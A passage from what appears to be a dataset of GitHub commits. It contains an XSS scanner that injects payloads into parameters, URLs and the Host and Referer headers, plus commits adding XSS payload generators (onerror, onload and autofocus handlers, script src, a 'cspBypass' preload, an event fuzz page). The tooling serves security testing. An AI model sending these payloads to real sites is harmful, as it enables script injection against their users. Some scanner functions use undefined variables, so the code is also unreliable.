as f: for line in f: if line: payload_list.append(line.rstrip()) return payload_list def check_xss_impact(res_headers): print \"response header\",res_headers['Content-Type'] if res_headers['Content-Type']: if res_headers['Content-Type'].find('application/json') !=-1 or res_headers['Content-Type'].find('text/plain') !=-1: impact=\"Low\" else: impact=\"High\" else: impact=\"Low\" return impact def xss_payload_decode(payload): decoded_payload=urllib.unquote(payload).decode('utf8').encode('ascii','ignore') return decoded_payload def xss_post_method(url,method,headers,body,scanid=None): print url, headers,method,body temp_body={} post_vul_param='' for key,value in body.items(): xss_payloads=fetch_xss_payload() for payload in xss_payloads: temp_body.update(body) temp_body[key]=payload print \"updated body\",temp_body xss_post_request=req.api_request(url, \"POST\", headers, temp_body) decoded_payload=xss_payload_decode(payload) if xss_post_request.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_post_request.headers) if db_update is not True: attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) db_update=True vul_param +=key else: result=True if vul_param=='': post_vul_param +=key else: post_vul_param +=','+key if post_vul_param: dbupdate.update_record({\"scanid\": scanid},{\"$set\":{\"scan_data\": post_vul_param+\" are vulnerable to XSS\"}}) def xss_http_headers(url,method,headers,body,scanid=None): temp_headers={} temp_headers.update(headers) xss_payloads=fetch_xss_payload() for payload in xss_payloads: parse_domain=urlparse.urlparse(url).netloc host_header={\"Host\": parse_domain +'/' +payload} headers.update(host_header) host_header_xss=req.api_request(url, \"GET\", headers) decoded_payload=xss_payload_decode(payload) if host_header_xss.text.find(decoded_payload) !=-1: impact=\"Low\" print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": host_header_xss.headers,\"res_body\": host_header_xss.text} dbupdate.insert_record(attack_result) break for payload in xss_payloads: referer_header_value='http://attackersite.com?test='+payload referer_header={\"Referer\": referer_header_value} temp_headers.update(referer_header) ref_header_xss=req.api_request(url, \"GET\", temp_headers) decoded_payload=xss_payload_decode(payload) if ref_header_xss.text.find(decoded_payload) !=-1: print ref_header_xss.text impact=check_xss_impact(temp_headers) print \"%s[{0}]{1} is vulnerable to XSS via referer header%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting via referer header\", \"impact\": impact, \"req_headers\": temp_headers, \"req_body\":body, \"res_headers\": ref_header_xss.headers,\"res_body\": ref_header_xss.text} dbupdate.insert_record(attack_result) return def xss_get_url(url,method,headers,body,scanid=None): result='' xss_payloads=fetch_xss_payload() uri_check_list=['?', '&', '=', '%3F', '%26', '%3D'] for uri_list in uri_check_list: if uri_list in url: parsed_url=urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path break if parsed_url=='': parsed_url=url for payload in xss_payloads: xss_request_url=req.api_request(parsed_url+'/'+payload,\"GET\",headers) if result is not True: decoded_payload=xss_payload_decode(payload) if xss_request_url.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request_url.headers) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers,\"res_body\": xss_request_url.text} dbupdate.insert_record(attack_result) result=True xss_request_uri=req.api_request(parsed_url+'/?test='+payload,\"GET\",headers) if xss_request_url.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request_uri.headers) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers,\"res_body\": xss_request_url.text} dbupdate.insert_record(attack_result) def xss_get_uri(url,method,headers,body,scanid=None): db_update='' vul_param='' url_query=urlparse.urlparse(url) parsed_query=urlparse.parse_qs(url_query.query) if parsed_query: for key,value in parsed_query.items(): try: result='' logs.logging.info(\"GET param for xss: %s\",key) xss_payloads=fetch_xss_payload() for payload in xss_payloads: if result is not True: parsed_url=urlparse.urlparse(url) xss_url=parsed_url.scheme+\"://\"+parsed_url.netloc+parsed_url.path+\"/?\"+parsed_url.query.replace(value[0], payload) xss_request=req.api_request(xss_url,\"GET\",headers) decoded_payload=xss_payload_decode(payload) print decoded_payload print xss_url if xss_request.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request.headers) logs.logging.info(\"%s is vulnerable to XSS\",url) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) if db_update is not True: attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) result,db_update=True,True vul_param +=key else: result=True if vul_param=='': vul_param +=key else: vul_param +=','+key except: logs.logging.info(\"XSS: No GET param found!\") if vul_param: print vul_param,scanid dbupdate.update_record({\"scanid\": scanid},{\"$set\":{\"scan_data\": vul_param+\" parameters are vulnerable to XSS\"}}) def xss_check(url,method,headers,body,scanid): if method=='GET' or method=='DEL': xss_get_uri(url,method,headers,body,scanid) xss_get_url(url,method,headers,body,scanid) if method=='POST' or method=='PUT': xss_post_method(url,method,headers,body,scanid) xss_http_headers(url,method,headers,body,scanid) ", "sourceWithComments": "import os\nimport urlparse\nimport sendrequest as req\nimport utils.logs as logs\nimport urlparse\nimport time\nimport urllib\n\nfrom utils.logger import logger\nfrom utils.db import Database_update\nfrom utils.config import get_value\n\ndbupdate = Database_update()\napi_logger = logger()\n\ndef fetch_xss_payload():\n    # Returns xss payloads in list type\n    payload_list = []\n    if os.getcwd().split('/')[-1] == 'API':\n        path = '../Payloads/xss.txt'\n    else:\n        path = 'Payloads/xss.txt'\n\n    with open(path) as f:\n        for line in f:\n            if line:\n                payload_list.append(line.rstrip())\n\n    return payload_list\n\ndef check_xss_impact(res_headers):\n    # Return the impact of XSS based on content-type header\n    print \"response header\",res_headers['Content-Type']\n    if res_headers['Content-Type']:\n        if res_headers['Content-Type'].find('application/json') != -1 or res_headers['Content-Type'].find('text/plain') != -1:\n            # Possible XSS \n            impact = \"Low\"\n        else:\n            impact = \"High\"\n    else:\n        impact = \"Low\"\n\n    return impact\n\n\ndef xss_payload_decode(payload):\n    # Return decoded payload of XSS. \n    decoded_payload = urllib.unquote(payload).decode('utf8').encode('ascii','ignore')\n    return decoded_payload\n\ndef xss_post_method(url,method,headers,body,scanid=None):\n    # This function checks XSS through POST method.\n    print url, headers,method,body\n    temp_body = {}\n    post_vul_param = ''\n    for key,value in body.items():\n        xss_payloads = fetch_xss_payload()\n        for payload in xss_payloads:\n            temp_body.update(body)\n            temp_body[key] = payload\n            print \"updated body\",temp_body\n            xss_post_request = req.api_request(url, \"POST\", headers, temp_body)\n            decoded_payload = xss_payload_decode(payload)\n            if xss_post_request.text.find(decoded_payload) != -1:\n                impact = check_xss_impact(xss_post_request.headers)\n                if db_update is not True:\n                    attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n                    dbupdate.insert_record(attack_result)\n                    db_update = True\n                    vul_param += key\n                else:\n                    result = True\n                    if vul_param == '':\n                        post_vul_param += key\n                    else:\n                        post_vul_param += ','+key \n\n    if post_vul_param:\n        dbupdate.update_record({\"scanid\": scanid}, {\"$set\" : {\"scan_data\" : post_vul_param+\" are vulnerable to XSS\"}})\n\n\ndef xss_http_headers(url,method,headers,body,scanid=None):\n    # This function checks different header based XSS.\n    # XSS via Host header (Limited to IE)\n    # Reference : http://sagarpopat.in/2017/03/06/yahooxss/\n    temp_headers = {}\n    temp_headers.update(headers)\n    xss_payloads = fetch_xss_payload()\n    for payload in xss_payloads:\n        parse_domain = urlparse.urlparse(url).netloc\n        host_header = {\"Host\" : parse_domain + '/' + payload}\n        headers.update(host_header)\n        host_header_xss = req.api_request(url, \"GET\", headers)\n        decoded_payload = xss_payload_decode(payload)\n        if host_header_xss.text.find(decoded_payload) != -1:\n            impact = \"Low\"\n            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": host_header_xss.headers ,\"res_body\": host_header_xss.text}\n            dbupdate.insert_record(attack_result)\n            break\n\n    # Test for Referer based XSS \n    for payload in xss_payloads:\n        referer_header_value = 'http://attackersite.com?test='+payload\n        referer_header = {\"Referer\" : referer_header_value}\n        temp_headers.update(referer_header)\n        ref_header_xss = req.api_request(url, \"GET\", temp_headers)\n        decoded_payload = xss_payload_decode(payload)\n        if ref_header_xss.text.find(decoded_payload) != -1:\n            print ref_header_xss.text\n            impact = check_xss_impact(temp_headers)\n            print \"%s[{0}] {1} is vulnerable to XSS via referer header%s\".format(impact,url)% (api_logger.G, api_logger.W)\n            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting via referer header\", \"impact\": impact, \"req_headers\": temp_headers, \"req_body\":body, \"res_headers\": ref_header_xss.headers ,\"res_body\": ref_header_xss.text}\n            dbupdate.insert_record(attack_result)\n            return\n\n\ndef xss_get_url(url,method,headers,body,scanid=None):\n    # Check for URL based XSS. \n    # Ex: http://localhost/<payload>, http://localhost//?randomparam=<payload>\n    result = ''\n    xss_payloads = fetch_xss_payload()\n    uri_check_list = ['?', '&', '=', '%3F', '%26', '%3D']\n    for uri_list in uri_check_list:\n        if uri_list in url:\n            # Parse domain name from URI.\n            parsed_url = urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path\n            break\n\n    if parsed_url == '':\n        parsed_url = url\n\n    for payload in xss_payloads:\n        xss_request_url = req.api_request(parsed_url+'/'+payload,\"GET\",headers)\n        if result is not True:\n            decoded_payload = xss_payload_decode(payload)\n            if xss_request_url.text.find(decoded_payload) != -1:\n                impact = check_xss_impact(xss_request_url.headers)\n                attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers ,\"res_body\": xss_request_url.text}\n                dbupdate.insert_record(attack_result)\n                result = True\n\n        xss_request_uri = req.api_request(parsed_url+'/?test='+payload,\"GET\",headers)             \n        if xss_request_url.text.find(decoded_payload) != -1:\n            impact = check_xss_impact(xss_request_uri.headers)\n            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers ,\"res_body\": xss_request_url.text}\n            dbupdate.insert_record(attack_result)\n                \n\ndef xss_get_uri(url,method,headers,body,scanid=None):\n    # This function checks for URI based XSS. \n    # http://localhost/?firstname=<payload>&lastname=<payload>\n    db_update = ''\n    vul_param = ''\n    url_query = urlparse.urlparse(url)\n    parsed_query = urlparse.parse_qs(url_query.query)\n    if parsed_query:\n        for key,value in parsed_query.items():\n            try:\n                result = ''\n                logs.logging.info(\"GET param for xss : %s\",key)\n                xss_payloads = fetch_xss_payload()\n                for payload in xss_payloads:\n                    # check for URI based XSS\n                    # Example : http://localhost/?firstname=<payload>&lastname=<payload>\n                    if result is not True:\n                        parsed_url = urlparse.urlparse(url)\n                        xss_url = parsed_url.scheme+\"://\"+parsed_url.netloc+parsed_url.path+\"/?\"+parsed_url.query.replace(value[0], payload)\n                        xss_request = req.api_request(xss_url,\"GET\",headers)\n                        decoded_payload = xss_payload_decode(payload)\n                        print decoded_payload\n                        print xss_url\n                        if xss_request.text.find(decoded_payload) != -1:\n                            impact = check_xss_impact(xss_request.headers)\n                            logs.logging.info(\"%s is vulnerable to XSS\",url)\n                            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n                            if db_update is not True:\n                                attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n                                dbupdate.insert_record(attack_result)\n                                result,db_update = True,True\n                                vul_param += key\n                            else:\n                                result = True\n                                if vul_param == '':\n                                    vul_param += key\n                                else:\n                                    vul_param += ','+key                  \n        \n            except:\n                logs.logging.info(\"XSS: No GET param found!\")\n\n        if vul_param:\n            # Update all vulnerable params to db.\n            print vul_param,scanid\n            dbupdate.update_record({\"scanid\": scanid}, {\"$set\" : {\"scan_data\" : vul_param+\" parameters are vulnerable to XSS\"}})\n\n\ndef xss_check(url,method,headers,body,scanid):\n    # Main function for XSS attack\n    if method == 'GET' or method == 'DEL':\n        xss_get_uri(url,method,headers,body,scanid)\n        xss_get_url(url,method,headers,body,scanid)\n\n    if method == 'POST' or method == 'PUT':\n        xss_post_method(url,method,headers,body,scanid)\n\n    xss_http_headers(url,method,headers,body,scanid)"}}, "msg": "Minor changes in xss_post_method function"}}, "https://github.com/LyleMi/Saker": {"bc18f1148918f6cef38f2d7f575482dc43575b7b": {"url": "https://api.github.com/repos/LyleMi/Saker/commits/bc18f1148918f6cef38f2d7f575482dc43575b7b", "html_url": "https://github.com/LyleMi/Saker/commit/bc18f1148918f6cef38f2d7f575482dc43575b7b", "sha": "bc18f1148918f6cef38f2d7f575482dc43575b7b", "keyword": "XSS update", "diff": "diff --git a/saker/fuzzers/xss.py b/saker/fuzzers/xss.py\nindex 01d4a9a..02252f7 100644\n--- a/saker/fuzzers/xss.py\n+++ b/saker/fuzzers/xss.py\n@@ -20,8 +20,22 @@ def alterTest(self, p=False):\n         return \"<script>alert(/xss/)</script>\"\n \n     def img(self):\n-        payload = \"<img src='%s'></img>\" % self.url\n-        return payload\n+        return '<img/onerror=\"%s\"/src=x>' % payload\n+\n+    def svg(self, payload):\n+        return '<svg/onload=\"%s\"/>' % payload\n+\n+    def style(self, payload):\n+        return '<style/onload=\"%s\"></style>' % payload\n+\n+    def input(self, payload):\n+        return '<input/onfocus=\"%s\"/autofocus>' % payload\n+\n+    def marquee(self, payload):\n+        return '<marquee/onstart=\"%s\"></marquee>' % payload\n+\n+    def div(self, payload):\n+        return '<div/onwheel=\"%s\"/style=\"height:200%;width:100%\"></div>' % payload\n \n     def script(self):\n         payload = \"<script src='%s'></script>\" % self.url\n", "message": "", "files": {"/saker/fuzzers/xss.py": {"changes": [{"diff": "\n         return \"<script>alert(/xss/)</script>\"\n \n     def img(self):\n-        payload = \"<img src='%s'></img>\" % self.url\n-        return payload\n+        return '<img/onerror=\"%s\"/src=x>' % payload\n+\n+    def svg(self, payload):\n+        return '<svg/onload=\"%s\"/>' % payload\n+\n+    def style(self, payload):\n+        return '<style/onload=\"%s\"></style>' % payload\n+\n+    def input(self, payload):\n+        return '<input/onfocus=\"%s\"/autofocus>' % payload\n+\n+    def marquee(self, payload):\n+        return '<marquee/onstart=\"%s\"></marquee>' % payload\n+\n+    def div(self, payload):\n+        return '<div/onwheel=\"%s\"/style=\"height:200%;width:100%\"></div>' % payload\n \n     def script(self):\n         payload = \"<script src='%s'></script>\" % self.url\n", "add": 16, "remove": 2, "filename": "/saker/fuzzers/xss.py", "badparts": ["        payload = \"<img src='%s'></img>\" % self.url", "        return payload"], "goodparts": ["        return '<img/onerror=\"%s\"/src=x>' % payload", "    def svg(self, payload):", "        return '<svg/onload=\"%s\"/>' % payload", "    def style(self, payload):", "        return '<style/onload=\"%s\"></style>' % payload", "    def input(self, payload):", "        return '<input/onfocus=\"%s\"/autofocus>' % payload", "    def marquee(self, payload):", "        return '<marquee/onstart=\"%s\"></marquee>' % payload", "    def div(self, payload):", "        return '<div/onwheel=\"%s\"/style=\"height:200%;width:100%\"></div>' % payload"]}], "source": "\n from saker.fuzzers.fuzzer import Fuzzer class XSS(Fuzzer): \"\"\"generate XSS payload\"\"\" def __init__(self, url=\"\"): \"\"\" url: xss payload url \"\"\" super(XSS, self).__init__() self.url=url @staticmethod def alterTest(self, p=False): return \"<script>alert(/xss/)</script>\" def img(self): payload=\"<img src='%s'></img>\" % self.url return payload def script(self): payload=\"<script src='%s'></script>\" % self.url return payload def event(self, element, src, event, js): payload=\"<%s src=\" % element payload +='\"%s\" ' % src payload +=event payload +=\"=%s >\" % js return payload def cspBypass(self): return \"<link rel='preload' href='%s'>\" % self.url ", "sourceWithComments": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\nfrom saker.fuzzers.fuzzer import Fuzzer\n\n\nclass XSS(Fuzzer):\n\n    \"\"\"generate XSS payload\"\"\"\n\n    def __init__(self, url=\"\"):\n        \"\"\"\n        url: xss payload url\n        \"\"\"\n        super(XSS, self).__init__()\n        self.url = url\n\n    @staticmethod\n    def alterTest(self, p=False):\n        return \"<script>alert(/xss/)</script>\"\n\n    def img(self):\n        payload = \"<img src='%s'></img>\" % self.url\n        return payload\n\n    def script(self):\n        payload = \"<script src='%s'></script>\" % self.url\n        return payload\n\n    def event(self, element, src, event, js):\n        payload = \"<%s src=\" % element\n        payload += '\"%s\" ' % src\n        payload += event\n        payload += \"=%s >\" % js\n        return payload\n\n    def cspBypass(self):\n        return \"<link rel='preload' href='%s'>\" % self.url\n"}}, "msg": "update xss payload"}, "47abf048e510b5be0118d7fc390d0f0202040bca": {"url": "https://api.github.com/repos/LyleMi/Saker/commits/47abf048e510b5be0118d7fc390d0f0202040bca", "html_url": "https://github.com/LyleMi/Saker/commit/47abf048e510b5be0118d7fc390d0f0202040bca", "sha": "47abf048e510b5be0118d7fc390d0f0202040bca", "keyword": "XSS update", "diff": "diff --git a/saker/fuzzers/xss.py b/saker/fuzzers/xss.py\nindex 02252f7..4bc1d5b 100644\n--- a/saker/fuzzers/xss.py\n+++ b/saker/fuzzers/xss.py\n@@ -3,11 +3,285 @@\n \n from saker.fuzzers.fuzzer import Fuzzer\n \n+_tags = [\n+    'a',\n+    'abbr',\n+    'acronym',\n+    'address',\n+    'applet',\n+    'area',\n+    'article',\n+    'aside',\n+    'audio',\n+    'b',\n+    'base',\n+    'basefont',\n+    'bdi',\n+    'bdo',\n+    'bgsound',\n+    'big',\n+    'blink',\n+    'blockquote',\n+    'body',\n+    'br',\n+    'button',\n+    'canvas',\n+    'caption',\n+    'center',\n+    'cite',\n+    'code',\n+    'col',\n+    'colgroup',\n+    'command',\n+    'content',\n+    'data',\n+    'datalist',\n+    'dd',\n+    'del',\n+    'details',\n+    'dfn',\n+    'dialog',\n+    'dir',\n+    'div',\n+    'dl',\n+    'dt',\n+    'element',\n+    'em',\n+    'embed',\n+    'fieldset',\n+    'figcaption',\n+    'figure',\n+    'font',\n+    'footer',\n+    'form',\n+    'frame',\n+    'frameset',\n+    'h1',\n+    'h2',\n+    'h3',\n+    'h4',\n+    'h5',\n+    'h6',\n+    'head',\n+    'header',\n+    'hgroup',\n+    'hr',\n+    'html',\n+    'i',\n+    'iframe',\n+    'image',\n+    'img',\n+    'input',\n+    'ins',\n+    'isindex',\n+    'kbd',\n+    'keygen',\n+    'label',\n+    'layer',\n+    'legend',\n+    'li',\n+    'link',\n+    'listing',\n+    'main',\n+    'map',\n+    'mark',\n+    'marquee',\n+    'menu',\n+    'menuitem',\n+    'meta',\n+    'meter',\n+    'multicol',\n+    'nav',\n+    'nobr',\n+    'noembed',\n+    'noframes',\n+    'nolayer',\n+    'noscript',\n+    'object',\n+    'ol',\n+    'optgroup',\n+    'option',\n+    'output',\n+    'p',\n+    'param',\n+    'picture',\n+    # 'plaintext',\n+    'pre',\n+    'progress',\n+    'q',\n+    'rp',\n+    'rt',\n+    'rtc',\n+    'ruby',\n+    's',\n+    'samp',\n+    'script',\n+    'section',\n+    'select',\n+    'shadow',\n+    'small',\n+    'source',\n+    'spacer',\n+    'span',\n+    'strike',\n+    'strong',\n+    'style',\n+    'sub',\n+    'summary',\n+    'sup',\n+    'table',\n+    'tbody',\n+    'td',\n+    'template',\n+    'textarea',\n+    'tfoot',\n+    'th',\n+    'thead',\n+    'time',\n+    'title',\n+    'tr',\n+    'track',\n+    'tt',\n+    'u',\n+    'ul',\n+    'var',\n+    'video',\n+    'wbr',\n+    'xmp',\n+]\n+\n+_events = [\n+    'onabort',\n+    'onautocomplete',\n+    'onautocompleteerror',\n+    'onafterscriptexecute',\n+    'onanimationend',\n+    'onanimationiteration',\n+    'onanimationstart',\n+    'onbeforecopy',\n+    'onbeforecut',\n+    'onbeforeload',\n+    'onbeforepaste',\n+    'onbeforescriptexecute',\n+    'onbeforeunload',\n+    'onbegin',\n+    'onblur',\n+    'oncanplay',\n+    'oncanplaythrough',\n+    'onchange',\n+    'onclick',\n+    'oncontextmenu',\n+    'oncopy',\n+    'oncut',\n+    'ondblclick',\n+    'ondrag',\n+    'ondragend',\n+    'ondragenter',\n+    'ondragleave',\n+    'ondragover',\n+    'ondragstart',\n+    'ondrop',\n+    'ondurationchange',\n+    'onend',\n+    'onemptied',\n+    'onended',\n+    'onerror',\n+    'onfocus',\n+    'onfocusin',\n+    'onfocusout',\n+    'onhashchange',\n+    'oninput',\n+    'oninvalid',\n+    'onkeydown',\n+    'onkeypress',\n+    'onkeyup',\n+    'onload',\n+    'onloadeddata',\n+    'onloadedmetadata',\n+    'onloadstart',\n+    'onmessage',\n+    'onmousedown',\n+    'onmouseenter',\n+    'onmouseleave',\n+    'onmousemove',\n+    'onmouseout',\n+    'onmouseover',\n+    'onmouseup',\n+    'onmousewheel',\n+    'onoffline',\n+    'ononline',\n+    'onorientationchange',\n+    'onpagehide',\n+    'onpageshow',\n+    'onpaste',\n+    'onpause',\n+    'onplay',\n+    'onplaying',\n+    'onpopstate',\n+    'onprogress',\n+    'onratechange',\n+    'onreset',\n+    'onresize',\n+    'onscroll',\n+    'onsearch',\n+    'onseeked',\n+    'onseeking',\n+    'onselect',\n+    'onselectionchange',\n+    'onselectstart',\n+    'onstalled',\n+    'onstorage',\n+    'onsubmit',\n+    'onsuspend',\n+    'ontimeupdate',\n+    'ontoggle',\n+    'ontouchcancel',\n+    'ontouchend',\n+    'ontouchmove',\n+    'ontouchstart',\n+    'ontransitionend',\n+    'onunload',\n+    'onvolumechange',\n+    'onwaiting',\n+    'onwebkitanimationend',\n+    'onwebkitanimationiteration',\n+    'onwebkitanimationstart',\n+    'onwebkitfullscreenchange',\n+    'onwebkitfullscreenerror',\n+    'onwebkitkeyadded',\n+    'onwebkitkeyerror',\n+    'onwebkitkeymessage',\n+    'onwebkitneedkey',\n+    'onwebkitsourceclose',\n+    'onwebkitsourceended',\n+    'onwebkitsourceopen',\n+    'onwebkitspeechchange',\n+    'onwebkittransitionend',\n+    'onwheel'\n+]\n+\n+_htmlTemplate = '''\n+<!DOCTYPE html>\n+<html>\n+<head>\n+    <title>XSS Fuzzer</title>\n+    <meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" />\n+</head>\n+<body>\n+%s\n+</body>\n+</html>\n+'''\n+\n \n class XSS(Fuzzer):\n \n     \"\"\"generate XSS payload\"\"\"\n \n+    tags = _tags\n+    events = _events\n+    htmlTemplate = _htmlTemplate\n+\n     def __init__(self, url=\"\"):\n         \"\"\"\n         url: xss payload url\n@@ -15,11 +289,21 @@ def __init__(self, url=\"\"):\n         super(XSS, self).__init__()\n         self.url = url\n \n-    @staticmethod\n-    def alterTest(self, p=False):\n+    @classmethod\n+    def alterTest(cls, p=False):\n         return \"<script>alert(/xss/)</script>\"\n \n-    def img(self):\n+    @classmethod\n+    def genTestHTML(cls):\n+        s = ''\n+        for t in cls.tags:\n+            s += '<%s src=\"x\"' % t\n+            for e in cls.events:\n+                s += ''' %s=\"console.log('%s %s')\" ''' % (e, t, e)\n+            s += '>%s</%s>\\n' % (t, t)\n+        return cls.htmlTemplate % s\n+\n+    def img(self, payload):\n         return '<img/onerror=\"%s\"/src=x>' % payload\n \n     def svg(self, payload):\n", "message": "", "files": {"/saker/fuzzers/xss.py": {"changes": [{"diff": "\n         super(XSS, self).__init__()\n         self.url = url\n \n-    @staticmethod\n-    def alterTest(self, p=False):\n+    @classmethod\n+    def alterTest(cls, p=False):\n         return \"<script>alert(/xss/)</script>\"\n \n-    def img(self):\n+    @classmethod\n+    def genTestHTML(cls):\n+        s = ''\n+        for t in cls.tags:\n+            s += '<%s src=\"x\"' % t\n+            for e in cls.events:\n+                s += ''' %s=\"console.log('%s %s')\" ''' % (e, t, e)\n+            s += '>%s</%s>\\n' % (t, t)\n+        return cls.htmlTemplate % s\n+\n+    def img(self, payload):\n         return '<img/onerror=\"%s\"/src=x>' % payload\n \n     def svg(self, payload):\n", "add": 13, "remove": 3, "filename": "/saker/fuzzers/xss.py", "badparts": ["    @staticmethod", "    def alterTest(self, p=False):", "    def img(self):"], "goodparts": ["    @classmethod", "    def alterTest(cls, p=False):", "    @classmethod", "    def genTestHTML(cls):", "        s = ''", "        for t in cls.tags:", "            s += '<%s src=\"x\"' % t", "            for e in cls.events:", "                s += ''' %s=\"console.log('%s %s')\" ''' % (e, t, e)", "            s += '>%s</%s>\\n' % (t, t)", "        return cls.htmlTemplate % s", "    def img(self, payload):"]}], "source": "\n from saker.fuzzers.fuzzer import Fuzzer class XSS(Fuzzer): \"\"\"generate XSS payload\"\"\" def __init__(self, url=\"\"): \"\"\" url: xss payload url \"\"\" super(XSS, self).__init__() self.url=url @staticmethod def alterTest(self, p=False): return \"<script>alert(/xss/)</script>\" def img(self): return '<img/onerror=\"%s\"/src=x>' % payload def svg(self, payload): return '<svg/onload=\"%s\"/>' % payload def style(self, payload): return '<style/onload=\"%s\"></style>' % payload def input(self, payload): return '<input/onfocus=\"%s\"/autofocus>' % payload def marquee(self, payload): return '<marquee/onstart=\"%s\"></marquee>' % payload def div(self, payload): return '<div/onwheel=\"%s\"/style=\"height:200%;width:100%\"></div>' % payload def script(self): payload=\"<script src='%s'></script>\" % self.url return payload def event(self, element, src, event, js): payload=\"<%s src=\" % element payload +='\"%s\" ' % src payload +=event payload +=\"=%s >\" % js return payload def cspBypass(self): return \"<link rel='preload' href='%s'>\" % self.url ", "sourceWithComments": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\nfrom saker.fuzzers.fuzzer import Fuzzer\n\n\nclass XSS(Fuzzer):\n\n    \"\"\"generate XSS payload\"\"\"\n\n    def __init__(self, url=\"\"):\n        \"\"\"\n        url: xss payload url\n        \"\"\"\n        super(XSS, self).__init__()\n        self.url = url\n\n    @staticmethod\n    def alterTest(self, p=False):\n        return \"<script>alert(/xss/)</script>\"\n\n    def img(self):\n        return '<img/onerror=\"%s\"/src=x>' % payload\n\n    def svg(self, payload):\n        return '<svg/onload=\"%s\"/>' % payload\n\n    def style(self, payload):\n        return '<style/onload=\"%s\"></style>' % payload\n\n    def input(self, payload):\n        return '<input/onfocus=\"%s\"/autofocus>' % payload\n\n    def marquee(self, payload):\n        return '<marquee/onstart=\"%s\"></marquee>' % payload\n\n    def div(self, payload):\n        return '<div/onwheel=\"%s\"/style=\"height:200%;width:100%\"></div>' % payload\n\n    def script(self):\n        payload = \"<script src='%s'></script>\" % self.url\n        return payload\n\n    def event(self, element, src, event, js):\n        payload = \"<%s src=\" % element\n        payload += '\"%s\" ' % src\n        payload += event\n        payload += \"=%s >\" % js\n        return payload\n\n    def cspBypass(self):\n        return \"<link rel='preload' href='%s'>\" % self.url\n"}}, "msg": "update xss fuzz"}, "41edd3db5be87f860c0c37199de9b55596b704da": {"url": "https://api.github.com/repos/LyleMi/Saker/commits/41edd3db5be87f860c0c37199de9b55596b704da", "html_url": "https://github.com/LyleMi/Saker/commit/41edd3db5be87f860c0c37199de9b55596b704da", "sha": "41edd3db5be87f860c0c37199de9b55596b704da", "keyword": "XSS update", "diff": "diff --git a/saker/fuzzers/code.py b/saker/fuzzers/code.py\nindex 4408d99..2acf92f 100644\n--- a/saker/fuzzers/code.py\n+++ b/saker/fuzzers/code.py\n@@ -3,7 +3,8 @@\n \n import random\n import string\n-from urllib import quote\n+from urllib.parse import quote\n+from unicodedata import normalize\n from saker.fuzzers.fuzzer import Fuzzer\n \n \n@@ -70,3 +71,16 @@ def urlencode(s, force=False):\n             s = map(lambda i: hex(ord(i)).replace(\"0x\", \"%\"), s)\n             s = \"\".join(s)\n         return s\n+\n+    @staticmethod\n+    def findUpper(dst):\n+        return list(filter(lambda i: i.upper() == dst, map(chr, range(1, 0x10000))))\n+\n+    @staticmethod\n+    def findLower(dst):\n+        return list(filter(lambda i: i.lower() == dst, map(chr, range(1, 0x10000))))\n+\n+    @staticmethod\n+    def findNormalize(dst, form='NFKC'):\n+        # form should in ['NFC', 'NFKC', 'NFD', 'NFKD']\n+        return list(filter(lambda i: normalize(form, i)[0] == dst, map(chr, range(1, 0x10000))))\ndiff --git a/saker/fuzzers/xss.py b/saker/fuzzers/xss.py\nindex 9a01ff5..fbcdae9 100644\n--- a/saker/fuzzers/xss.py\n+++ 